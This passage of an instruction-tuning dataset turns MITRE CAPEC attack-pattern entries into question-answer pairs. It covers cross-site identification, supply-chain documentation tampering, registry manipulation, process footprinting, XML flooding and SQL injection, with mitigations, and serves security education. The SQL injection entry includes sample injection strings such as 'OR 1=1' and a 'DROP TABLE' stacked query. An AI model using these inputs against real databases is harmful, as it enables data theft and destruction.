              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow, Mitigations, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Cross Site Identification (CAPEC ID: 467)",
    "context": "",
    "output": "Possible examples: An attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in their browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in their browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site.",
      "@Name": "Cross Site Identification (CAPEC ID: 467)",
      "attack_ptrn": {
        "@ID": "467",
        "@Name": "Cross Site Identification",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker harvests identifying information about a victim via an active session that the victim's browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the \"remember me\" feature to keep their session with the social networking site active. An attacker induces a payload to execute in the victim's browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing).",
        "Extended_Description": {
          "xhtml:p": "There are many other ways in which the attacker may get the payload to execute in the victim's browser mainly by finding a way to hide it in some reputable site that the victim visits. The attacker could also send the link to the victim in an e-mail and trick the victim into clicking on the link. This attack is basically a cross site request forgery attack with two main differences. First, there is no action that is performed on behalf of the user aside from harvesting information. So standard CSRF protection may not work in this situation. Second, what is important in this attack pattern is the nature of the data being harvested, which is identifying information that can be obtained and used in context. This real time harvesting of identifying information can be used as a prelude for launching real time targeted social engineering attacks on the victim."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "62"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The victim has an active session with the social networking site."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "An attacker should be able to create a payload and deliver it to the victim's browser."
            },
            {
              "@Level": "Medium",
              "#text": "An attacker needs to know how to interact with various social networking sites (e.g., via available APIs) to request information and how to send the harvested data back to the attacker."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Usage: Users should always explicitly log out from the social networking sites when done using them.",
            "Usage: Users should not open other tabs in the browser when using a social networking site."
          ]
        },
        "Example_Instances": {
          "Example": "An attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in their browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "352"
            },
            {
              "@CWE_ID": "359"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-404"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Example_Instances, Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Documentation Alteration to Produce Under-performing Systems (CAPEC ID: 518)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: A security subsystem involving encryption is a part of a product, but due to the demands of this subsystem during operation, the subsystem only runs when a specific amount of memory and processing is available. An attacker alters the descriptions of the system capabilities so that when deployed with the minimal requirements at the victim location, the encryption subsystem is never operational, leaving the system in a weakened security state.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A security subsystem involving encryption is a part of a product, but due to the demands of this subsystem during operation, the subsystem only runs when a specific amount of memory and processing is available. An attacker alters the descriptions of the system capabilities so that when deployed with the minimal requirements at the victim location, the encryption subsystem is never operational, leaving the system in a weakened security state.",
      "@Name": "Documentation Alteration to Produce Under-performing Systems (CAPEC ID: 518)",
      "attack_ptrn": {
        "@ID": "518",
        "@Name": "Documentation Alteration to Produce Under-performing Systems",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker with access to a manufacturer's documentation alters the descriptions of system capabilities with the intent of causing errors in derived system requirements, impacting the overall effectiveness and capability of the system, allowing an attacker to take advantage of the introduced system capability flaw once the system is deployed.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "447",
            "Exclude_Related": [
              {
                "@Exclude_ID": "513"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "Advanced knowledge of software and hardware capabilities of a manufacturer's product.",
            "Access to the manufacturer's documentation."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Ability to read, interpret, and subsequently alter manufacturer's documentation to misrepresent system capabilities."
            },
            {
              "@Level": "High",
              "#text": "Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Digitize documents and cryptographically sign them to verify authenticity.",
            "Password protect documents and make them read-only for unauthorized users.",
            "Avoid emailing important documents and configurations.",
            "Ensure deleted files are actually deleted.",
            "Maintain backups of the document for recovery and verification.",
            "Separate need-to-know information from system configuration information depending on the user."
          ]
        },
        "Example_Instances": {
          "Example": "A security subsystem involving encryption is a part of a product, but due to the demands of this subsystem during operation, the subsystem only runs when a specific amount of memory and processing is available. An attacker alters the descriptions of the system capabilities so that when deployed with the minimal requirements at the victim location, the encryption subsystem is never operational, leaving the system in a weakened security state."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-715"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations, References"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Rogue Integration Procedures (CAPEC ID: 524)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Rogue Integration Procedures (CAPEC ID: 524) are: An attacker gains access to a system integrator's documentation for the preparation of purchased systems designated for deployment at the victim's location. As a part of the preparation, the included 100 megabit network card is to be replaced with a 1 gigabit network card. The documentation is altered to reflect the type of 1 gigabit network card to use, and the attacker ensures that this type of network card is provided by the attacker's own supply. The card has additional malicious functionality which will allow for additional compromise by the attacker at the victim location once the system is deployed.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An attacker gains access to a system integrator's documentation for the preparation of purchased systems designated for deployment at the victim's location. As a part of the preparation, the included 100 megabit network card is to be replaced with a 1 gigabit network card. The documentation is altered to reflect the type of 1 gigabit network card to use, and the attacker ensures that this type of network card is provided by the attacker's own supply. The card has additional malicious functionality which will allow for additional compromise by the attacker at the victim location once the system is deployed.",
      "@Name": "Rogue Integration Procedures (CAPEC ID: 524)",
      "attack_ptrn": {
        "@ID": "524",
        "@Name": "Rogue Integration Procedures",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker alters or establishes rogue processes in an integration facility in order to insert maliciously altered components into the system. The attacker would then supply the malicious components. This would allow for malicious disruption or additional compromise when the system is deployed.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "439",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "Physical access to an integration facility that prepares the system before it is deployed at the victim location."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Advanced knowledge of the design of the system."
            },
            {
              "@Level": "High",
              "#text": "Hardware creation and manufacture of replacement components."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Deploy strong code integrity policies to allow only authorized apps to run.",
            "Use endpoint detection and response solutions that can automaticalkly detect and remediate suspicious activities.",
            "Maintain a highly secure build and update infrastructure by immediately applying security patches for OS and software, implementing mandatory integrity controls to ensure only trusted tools run, and requiring multi-factor authentication for admins.",
            "Require SSL for update channels and implement certificate transparency based verification.",
            "Sign everything, including configuration files, XML files and packages.",
            "Develop an incident response process, disclose supply chain incidents and notify customers with accurate and timely information.",
            "Maintain strong physical system access controls and monitor networks and physical facilities for insider threats."
          ]
        },
        "Example_Instances": {
          "Example": "An attacker gains access to a system integrator's documentation for the preparation of purchased systems designated for deployment at the victim's location. As a part of the preparation, the included 100 megabit network card is to be replaced with a 1 gigabit network card. The documentation is altered to reflect the type of 1 gigabit network card to use, and the attacker ensures that this type of network card is provided by the attacker's own supply. The card has additional malicious functionality which will allow for additional compromise by the attacker at the victim location once the system is deployed."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-716"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations, References"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Manipulate Registry Information (CAPEC ID: 203), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).",
      "@Name": "Manipulate Registry Information (CAPEC ID: 203)",
      "attack_ptrn": {
        "@ID": "203",
        "@Name": "Manipulate Registry Information",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "176",
            "Exclude_Related": [
              {
                "@Exclude_ID": "437"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The targeted application must rely on values stored in a registry.",
            "The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The adversary requires privileged credentials or the development/acquiring of a tailored remote access tool."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Mitigations": {
          "Mitigation": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys.",
            "Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.",
            "Employ robust identification and audit/blocking using an allowlist of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern."
          ]
        },
        "Example_Instances": {
          "Example": "Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it)."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "15"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1112",
              "Entry_Name": "Modify Registry"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1647",
              "Entry_Name": "Plist Modification"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Activation_Zone, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, References, Related_Weaknesses, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2018-07-31",
            "#text": "Manipulate Application Registry Values"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Process Footprinting (CAPEC ID: 573)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: On a Windows system, the command, \"tasklist,\" displays information about processes. The same function on a Mac OS system is done with the command, \"ps.\"\nIn addition to manual discovery of running processes, an adversary can develop malware that carries out this attack pattern before subsequent malicious action.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "On a Windows system, the command, \"tasklist,\" displays information about processes. The same function on a Mac OS system is done with the command, \"ps.\"",
        "In addition to manual discovery of running processes, an adversary can develop malware that carries out this attack pattern before subsequent malicious action."
      ],
      "@Name": "Process Footprinting (CAPEC ID: 573)",
      "attack_ptrn": {
        "@ID": "573",
        "@Name": "Process Footprinting",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary exploits functionality meant to identify information about the currently running processes on the target system to an authorized user. By knowing what processes are running on the target system, the adversary can learn about the target environment as a means towards further malicious behavior.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "169",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have gained access to the target system via physical or logical means in order to carry out this attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist."
        },
        "Example_Instances": {
          "Example": [
            "On a Windows system, the command, \"tasklist,\" displays information about processes. The same function on a Mac OS system is done with the command, \"ps.\"",
            "In addition to manual discovery of running processes, an adversary can develop malware that carries out this attack pattern before subsequent malicious action."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1057",
            "Entry_Name": "Process Discovery"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: XML Flood (CAPEC ID: 528)",
    "context": "",
    "output": "Possible examples: Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.",
      "@Name": "XML Flood (CAPEC ID: 528)",
      "attack_ptrn": {
        "@ID": "528",
        "@Name": "XML Flood",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one. In many cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing.",
        "Extended_Description": {
          "xhtml:p": "XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends."
        },
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "XML Denial of Service (XML DoS)"
          }
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "125",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.",
              "Technique": [
                "Use an automated tool to record all instances of URLs to process XML requests.",
                "Use a browser to manually explore the website and analyze how the application processes XML requests."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary crafts input data that may have an adverse effect on the operation of the web service when the XML data sent to the service."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Launch a resource depletion attack] The attacker delivers a large number of XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.",
              "Technique": "Send a large number of crafted XML messages to the target URL."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target must receive and process XML transactions.",
            "An adverssary must possess the ability to generate a large amount of XML based messages to send to the target service."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Denial of service"
          }
        },
        "Indicators": {
          "Indicator": "A large amount of data is passed to the XML parser possibly making it crash or otherwise unavailable to end users."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Resource Consumption"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.",
            "Implementation: Provide for network flow control and traffic shaping to control access to the resources."
          ]
        },
        "Example_Instances": {
          "Example": "Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "770"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1499.002",
              "Entry_Name": "Endpoint Denial of Service:Service Exhaustion Flood"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1498.001",
              "Entry_Name": "Network Denial of Service:Direct Network Flood"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, Related_Attack_Patterns, Skills_Required, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: SQL Injection (CAPEC ID: 66), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: With PHP-Nuke versions 7.9 and earlier, an attacker can successfully access and modify data, including sensitive contents such as usernames and password hashes, and compromise the application through SQL Injection. The protection mechanism against SQL Injection employs a denylist approach to input validation. However, because of an improper denylist, it is possible to inject content such as \"foo'/**/UNION\" or \"foo UNION/**/\" to bypass validation and glean sensitive information from the database. See also: CVE-2006-5525",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "With PHP-Nuke versions 7.9 and earlier, an attacker can successfully access and modify data, including sensitive contents such as usernames and password hashes, and compromise the application through SQL Injection. The protection mechanism against SQL Injection employs a denylist approach to input validation. However, because of an improper denylist, it is possible to inject content such as \"foo'/**/UNION\" or \"foo UNION/**/\" to bypass validation and glean sensitive information from the database. See also: CVE-2006-5525",
      "@Name": "SQL Injection (CAPEC ID: 66)",
      "attack_ptrn": {
        "@ID": "66",
        "@Name": "SQL Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input.",
        "Extended_Description": {
          "xhtml:p": "When specially crafted user-controlled input consisting of SQL syntax is used without proper validation as part of SQL queries, it is possible to glean information from the database in ways not envisaged during application design. Depending upon the database and the design of the application, it may also be possible to leverage injection to have the database execute system-related commands of the attackers' choice. SQL Injection enables an attacker to interact directly to the database, thus bypassing the application completely. Successful injection can cause information disclosure as well as ability to add or modify data in the database."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "248"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey application] The attacker first takes an inventory of the functionality exposed by the application.",
              "Technique": [
                "Spider web sites for all available links",
                "Sniff network communications with application using a utility such as WireShark."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax.",
              "Technique": [
                "Use web browser to inject input through text fields or through HTTP GET parameters.",
                "Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.",
                "Use network-level packet injection tools such as netcat to inject input",
                "Use modified client (modified by reverse engineering) to inject input."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Experiment with SQL Injection vulnerabilities] After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.",
              "Technique": [
                "Use public resources such as \"SQL Injection Cheat Sheet\" at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.",
                "Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : \"' OR 1=1; --\", or something else that would syntactically complete a hypothesized query. Iteratively refine the query.",
                "Use \"Blind SQL Injection\" techniques to extract information about the database schema.",
                "If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: \"'; DROP TABLE SYSOBJECTS; --\" and \"'); DROP TABLE SYSOBJECTS; --\". These particular queries will likely not work because the SYSOBJECTS table is generally protected."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Exploit SQL Injection vulnerability] After refining and adding various logic to SQL queries, craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal, modify, and/or delete database data, using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent.",
              "Technique": "Craft and Execute underlying SQL query"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "SQL queries used by the application to store, retrieve or modify data.",
            "User-controllable input that is not properly validated by the application as part of SQL queries."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "It is fairly simple for someone with basic SQL knowledge to perform SQL injection, in general. In certain instances, however, specific knowledge of the database employed may be required."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Indicators": {
          "Indicator": "Too many false or invalid queries to the database, especially those caused by malformed input."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
